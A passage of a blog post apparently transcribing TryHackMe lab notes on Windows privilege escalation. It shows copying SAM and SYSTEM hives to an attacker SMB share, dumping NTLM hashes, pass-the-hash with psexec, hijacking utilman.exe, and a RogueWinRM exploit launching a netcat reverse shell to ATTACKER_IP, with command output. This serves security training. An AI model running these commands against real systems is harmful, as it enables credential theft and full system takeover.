<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user@attackerpc$ mkdir share</span><br><span class="line">user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share</span><br></pre></td></tr></table></figure>

<p>This will create a share named <code>public</code> pointing to the <code>share</code> directory, which requires the username and password of our current windows session. After this, we can use the <code>copy</code> command in our windows machine to transfer both files to our AttackBox: </p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\</span><br><span class="line">C:\&gt; copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\</span><br></pre></td></tr></table></figure>

<p>And use impacket to retrieve the users’ password hashes:</p>
<p>Kali Linux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL</span><br><span class="line">Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821</span><br><span class="line">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>

<p>We can finally use the Administrator’s hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:</p>
<p>Kali Linux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP</span><br><span class="line">Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Requesting shares on 10.10.175.90.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file nfhtabqO.exe</span><br><span class="line">[*] Opening SVCManager on 10.10.175.90.....</span><br><span class="line">[*] Creating service RoLE on 10.10.175.90.....</span><br><span class="line">[*] Starting service RoLE.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1821]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>



<h5 id="SeTakeOwnership"><a href="#SeTakeOwnership" class="headerlink" title="SeTakeOwnership"></a>SeTakeOwnership</h5><p>The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service’s executable. For this task, we will be taking a different route, however.</p>
<p>To get the SeTakeOwnership privilege, we need to open a command prompt using the “Open as administrator” option. We will be asked to input our password to get an elevated console:</p>
<p><img src="/img/loading.gif" data-original="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/33303d0cde736589d2838ee894379ff2.png" alt="Run as admin"></p>
<p>Once on the command prompt, we can check our privileges with the following command:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                              State</span><br><span class="line">============================= ======================================== ========</span><br><span class="line">SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled</span><br></pre></td></tr></table></figure>

<p>We’ll abuse <code>utilman.exe</code> to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:</p>
<p><img src="/img/loading.gif" data-original="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a5437a609e41d982b320967667e9b97a.png" alt="utilman normal behaviour"></p>
<p>Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.</p>
<p>To replace utilman, we will start by taking ownership of it with the following command:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; takeown /f C:\Windows\System32\Utilman.exe</span><br><span class="line"></span><br><span class="line">SUCCESS: The file (or folder): &quot;C:\Windows\System32\Utilman.exe&quot; now owned by user &quot;WINPRIVESC2\thmtakeownership&quot;.</span><br></pre></td></tr></table></figure>

<p>Notice that being the owner of a file doesn’t necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F</span><br><span class="line">processed file: Utilman.exe</span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br></pre></td></tr></table></figure>

<p>After this, we will replace utilman.exe with a copy of cmd.exe:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\&gt; copy cmd.exe utilman.exe</span><br><span class="line">        1 file(s) copied.</span><br></pre></td></tr></table></figure>

<p>To trigger utilman, we will lock our screen from the start button:</p>
<p><img src="/img/loading.gif" data-original="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dd7290ca93369cee33182023cb9190ff.png" alt="lock screen"></p>
<p>And finally, proceed to click on the “Ease of Access” button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:</p>
<p><img src="/img/loading.gif" data-original="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1401bc3dcb1e4eb84f526b95567a5ef8.png" alt="utilman shell"></p>
<h5 id="SeImpersonate-x2F-SeAssignPrimaryToken"><a href="#SeImpersonate-x2F-SeAssignPrimaryToken" class="headerlink" title="SeImpersonate &#x2F; SeAssignPrimaryToken"></a>SeImpersonate &#x2F; SeAssignPrimaryToken</h5><p><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RogueWinRM">https://github.com/antonioCoco/RogueWinRM</a></p>
<p>These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.</p>
<p>Impersonation is easily understood when you think about how an FTP server works. The FTP server must restrict users to only access the files they should be allowed to see.</p>
<p>Let’s assume we have an FTP service running with user <code>ftp</code>. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann’s:</p>
<p><img src="/img/loading.gif" data-original="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/006115497113a0a4f03008028dc32fb7.png" alt="FTP server without impersonation"></p>
<p>There are several reasons why using ftp’s token is not the best idea: - For the files to be served correctly, they would need to be accessible to the <code>ftp</code> user. In the example above, the FTP service would be able to access Ann’s files, but not Bill’s files, as the DACL in Bill’s files doesn’t allow user <code>ftp</code>. This adds complexity as we must manually configure specific permissions for each served file&#x2F;directory. - For the operating system, all files are accessed by user <code>ftp</code>, independent of which user is currently logged in to the FTP service. This makes it impossible to delegate the authorisation to the operating system; therefore, the FTP service must implement it. - If the FTP service were compromised at some point, the attacker would immediately gain access to all of the folders to which the <code>ftp</code> user has access.</p>
<p>If, on the other hand, the FTP service’s user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf:</p>
<p><img src="/img/loading.gif" data-original="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c25de66ae7777169d09a61ce2fb38e28.png" alt="FTP server with impersonation"></p>
<p>Now, if user Ann logs in to the FTP service and given that the ftp user has impersonation privileges, it can borrow Ann’s access token and use it to access her files. This way, the files don’t need to provide access to user <code>ftp</code> in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won’t be able to access Jude’s or Bill’s files during that session.</p>
<p>As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.</p>
<p>In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. Internet Information Services (IIS) will also create a similar default account called “iis apppool\defaultapppool” for web applications.</p>
<p><strong>To elevate privileges using such accounts, an attacker needs the following:</strong></p>
<ol>
<li><strong>To spawn a process so that users can connect and authenticate to it for impersonation to occur.</strong> </li>
<li><strong>Find a way to force privileged users to connect and authenticate to the spawned malicious process.</strong></li>
</ol>
<p>We will use RogueWinRM exploit to accomplish both conditions.</p>
<p>Let’s start by assuming we have already compromised a website running on IIS and that we have planted a web shell on the following address:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://MACHINE_IP/</span><br></pre></td></tr></table></figure>

<p>We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:</p>
<p><img src="/img/loading.gif" data-original="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4603506a36f4bbda602dc67cdc845d9f.png" alt="Webshell impersonate privileges"></p>
<p>To use RogueWinRM, we first need to upload the exploit to the target machine. For your convenience, this has already been done, and you can find the exploit in the <code>C:\tools\</code> folder.</p>
<p>The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.</p>
<p>If, for some reason, the WinRM service isn’t running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.</p>
<p>Before running the exploit, we’ll start a netcat listener to receive a reverse shell on our attacker’s machine:</p>
<p>Kali Linux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@attackerpc$ nc -lvp 4442</span><br></pre></td></tr></table></figure>

<p>And then, use our web shell to trigger the RogueWinRM exploit using the following command:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\tools\RogueWinRM\RogueWinRM.exe -p &quot;C:\tools\nc64.exe&quot; -a &quot;-e cmd.exe ATTACKER_IP 4442&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" data-original="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/24545e313a2e5ddee2386a68b4c7adeb.png" alt="RogueWinRM exploit execution"></p>
<p><strong>Note:</strong> The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.</p>
<p>The <code>-p</code> parameter specifies the executable to be run by the exploit, which is <code>nc64.exe</code> in this case. The <code>-a</code> parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be <code>-e cmd.exe ATTACKER_IP 4442</code>.</p>
<p>If all was correctly set up, you should expect a shell with SYSTEM privileges:</p>
<p>Kali Linux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">user@attackerpc$ nc -lvp 4442</span><br><span class="line">Listening on 0.0.0.0 4442</span><br><span class="line">Connection received on 10.10.175.90 49755</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1821]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv&gt;whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>

<h3 id="Abusing-vulnerable-software"><a href="#Abusing-vulnerable-software" class="headerlink" title="Abusing vulnerable software"></a>Abusing vulnerable software</h3><p><strong>Unpatched Software</strong></p>
<p>Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system. You can use the <code>wmic</code> tool to list software installed on the target system and its versions. The command below will dump information it can gather on installed software (it might take around a minute to finish):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version,vendor</span><br></pre></td></tr></table></figure>

<p>Remember that the <code>wmic product</code> command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.</p>
<p>Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like <a target="_blank" rel="noopener" href="https://www.exploit-db.com/">exploit-db</a>, <a target="_blank" rel="noopener" href="https://packetstormsecurity.com/">packet storm</a> or plain old <a target="_blank" rel="noopener" href="https://www.google.com/">Google</a>, amongst many others.</p>
<p>Using wmic and Google, can you find a known vulnerability on any installed product?</p>
<h3 id="Tools-1"><a href="#Tools-1" class="headerlink" title="Tools"></a>Tools</h3><p>Several scripts exist to conduct system enumeration in ways similar to the ones seen in the previous task. These tools can shorten the enumeration process time and uncover different potential privilege escalation vectors. However, please remember that automated tools can sometimes miss privilege escalation.</p>
<p>Below are a few tools commonly used to identify privilege escalation vectors. Feel free to run them against any of the machines in this room and see if the results match the discussed attack vectors.</p>
<h5 id="WinPEAS"><a href="#WinPEAS" class="headerlink" title="WinPEAS"></a>WinPEAS</h5><p>WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. You can find more information about winPEAS and download either the precompiled executable or a .bat script. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file, as shown below:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; winpeas.exe &gt; outputfile.txt</span><br></pre></td></tr></table></figure>

<p>WinPEAS can be downloaded <a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">here</a>.</p>
<h5 id="PrivescCheck"><a href="#PrivescCheck" class="headerlink" title="PrivescCheck"></a>PrivescCheck</h5><p>PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.</p>
<p>PrivescCheck can be downloaded <a target="_blank" rel="noopener" href="https://github.com/itm4n/PrivescCheck">here</a>.</p>
<p><strong>Reminder</strong>: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the <code>Set-ExecutionPolicy</code> cmdlet as shown below.</p>
<p>Powershell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Set-ExecutionPolicy Bypass -Scope process -Force</span><br><span class="line">PS C:\&gt; . .\PrivescCheck.ps1</span><br><span class="line">PS C:\&gt; Invoke-PrivescCheck</span><br></pre></td></tr></table></figure>



<h5 id="WES-NG-Windows-Exploit-Suggester-Next-Generation"><a href="#WES-NG-Windows-Exploit-Suggester-Next-Generation" class="headerlink" title="WES-NG: Windows Exploit Suggester - Next Generation"></a>WES-NG: Windows Exploit Suggester - Next Generation</h5><p>Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).</p>
<p>WES-NG is a Python script that can be found and downloaded <a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">here</a>.</p>
<p>Once installed, and before using it, type the <code>wes.py --update</code> command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability you can use to elevate your privileges on the target system.</p>
<p>To use the script, you will need to run the <code>systeminfo</code> command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.</p>
<p>Once this is done, wes.py can be run as follows;</p>
<p>Kali Linux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@kali$ wes.py systeminfo.txt</span><br></pre></td></tr></table></figure>



<h5 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h5><p>If you already have a Meterpreter shell on the target system, you can use the <code>multi/recon/local_exploit_suggester</code> module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.</p>
<p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://yake-daigua.top">yake-daigua</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://yake-daigua.top/2022/12/10/TryHackMe_2/">https://yake-daigua.top/2022/12/10/TryHackMe_2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yake-daigua.top" target="_blank">yake-daigua</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PEN/">PEN</a><a class="post-meta__tags" href="/tags/THM/">THM</a></div><div class="post_share"><div class="social-share" data-image="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/220703.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/12/04/TryHackMe_1/"><img class="next-cover" src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/4201644.jpg" onerror="onerror=null;src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_1</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/12/04/TryHackMe_1/" title="TryHackMe_1"><img class="cover" src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/4201644.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-04</div><div class="title">TryHackMe_1</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="avatar"/></div><div class="author-info__name">yake-daigua</div><div class="author-info__description">爱蜜莉雅,我好喜欢你</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/yake-daigua"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到yake-daigua的Blog，不定期更新技术总结文章和个人阶段性学习成果。加油啊，敲键盘的大哥哥。<img src="/img/loading.gif" data-original="https://npm.arcitcgn.cn/aciano-cdn@1.0.10/Yay.gif"></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Jr-Pentetration-Tester"><span class="toc-number">1.</span> <span class="toc-text">Jr Pentetration Tester</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction-to-Cyber-Security"><span class="toc-number">2.</span> <span class="toc-text">Introduction to Cyber Security</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction-to-Pentesting"><span class="toc-number">3.</span> <span class="toc-text">Introduction to Pentesting</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Intro-to-Web-Hacking"><span class="toc-number">4.</span> <span class="toc-text">Intro to Web Hacking</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Content-DIscovery"><span class="toc-number">4.0.1.</span> <span class="toc-text">Content DIscovery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SubDomain-Enumeration"><span class="toc-number">4.0.2.</span> <span class="toc-text">SubDomain Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Authentication-Bypass"><span class="toc-number">4.0.3.</span> <span class="toc-text">Authentication Bypass</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nmap"><span class="toc-number">5.</span> <span class="toc-text">Nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Live-Host-Discovery"><span class="toc-number">5.0.1.</span> <span class="toc-text">Nmap Live Host Discovery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Basic-Port-Scans"><span class="toc-number">5.0.2.</span> <span class="toc-text">Nmap Basic Port Scans</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Protocols-and-Servers"><span class="toc-number">5.0.3.</span> <span class="toc-text">Protocols and Servers</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux-Privilege-Escalation"><span class="toc-number">6.</span> <span class="toc-text">Linux Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumeration"><span class="toc-number">6.0.1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tools"><span class="toc-number">6.0.2.</span> <span class="toc-text">Tools</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kernel-Exploits"><span class="toc-number">6.0.3.</span> <span class="toc-text">Kernel Exploits</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sudo"><span class="toc-number">6.0.4.</span> <span class="toc-text">Sudo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUID"><span class="toc-number">6.0.5.</span> <span class="toc-text">SUID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Capabilities"><span class="toc-number">6.0.6.</span> <span class="toc-text">Capabilities</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cron-Jobs"><span class="toc-number">6.0.7.</span> <span class="toc-text">Cron Jobs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PATH"><span class="toc-number">6.0.8.</span> <span class="toc-text">PATH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NFS"><span class="toc-number">6.0.9.</span> <span class="toc-text">NFS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows-Privilege-Escalation"><span class="toc-number">7.</span> <span class="toc-text">Windows Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Prevention"><span class="toc-number">7.0.1.</span> <span class="toc-text">Prevention</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Harvesting-Passwords-from-Usual-Spots"><span class="toc-number">7.0.2.</span> <span class="toc-text">Harvesting Passwords from Usual Spots</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Unattended-Windows-Installations"><span class="toc-number">7.0.2.0.1.</span> <span class="toc-text">Unattended Windows Installations</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Powershell-History"><span class="toc-number">7.0.2.0.2.</span> <span class="toc-text">Powershell History</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Saved-Windows-Credentials"><span class="toc-number">7.0.2.0.3.</span> <span class="toc-text">Saved Windows Credentials</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#IIS-Configuration"><span class="toc-number">7.0.2.0.4.</span> <span class="toc-text">IIS Configuration</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Retrieve-Credentials-from-Software-PuTTY"><span class="toc-number">7.0.2.0.5.</span> <span class="toc-text">Retrieve Credentials from Software: PuTTY</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Other-Quick-Wins"><span class="toc-number">7.0.3.</span> <span class="toc-text">Other Quick Wins</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Scheduled-Tasks"><span class="toc-number">7.0.3.0.1.</span> <span class="toc-text">Scheduled Tasks</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AlwaysInstallElevated"><span class="toc-number">7.0.3.0.2.</span> <span class="toc-text">AlwaysInstallElevated</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-Service-Misconfigurations"><span class="toc-number">7.0.4.</span> <span class="toc-text">Abusing Service Misconfigurations</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Windows-Services"><span class="toc-number">7.0.4.0.1.</span> <span class="toc-text">Windows Services</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Insecure-Permissions-on-Service-Executable"><span class="toc-number">7.0.4.0.2.</span> <span class="toc-text">Insecure Permissions on Service Executable</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Unquoted-Service-Paths"><span class="toc-number">7.0.4.0.3.</span> <span class="toc-text">Unquoted Service Paths</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Insecure-Service-Permissions"><span class="toc-number">7.0.4.0.4.</span> <span class="toc-text">Insecure Service Permissions</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-dangerous-privileges"><span class="toc-number">7.0.5.</span> <span class="toc-text">Abusing dangerous privileges</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Windows-Privileges"><span class="toc-number">7.0.5.0.1.</span> <span class="toc-text">Windows Privileges</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SeBackup-x2F-SeRestore"><span class="toc-number">7.0.5.0.2.</span> <span class="toc-text">SeBackup &#x2F; SeRestore</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SeTakeOwnership"><span class="toc-number">7.0.5.0.3.</span> <span class="toc-text">SeTakeOwnership</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" 